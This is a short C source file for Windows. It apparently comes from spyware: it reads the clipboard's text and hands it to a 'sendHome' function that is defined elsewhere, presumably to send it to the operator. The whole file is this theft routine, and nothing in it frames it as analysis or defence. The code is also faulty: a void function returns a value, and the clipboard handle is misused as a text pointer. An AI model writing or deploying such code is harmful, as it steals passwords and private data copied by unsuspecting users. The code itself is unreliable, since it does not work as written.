#include "config.h"

void clipboard()
{
    char string[1000];
    HANDLE handle;

    OpenClipboard(NULL);
    handle = GetClipboardData(CF_TEXT);
    GlobalLock(handle);

    sprintf_s(string, 1000, "%s\n", (char*)handle);

    GlobalUnlock(handle);
    CloseClipboard();

    sendHome(string);
    return 0;
}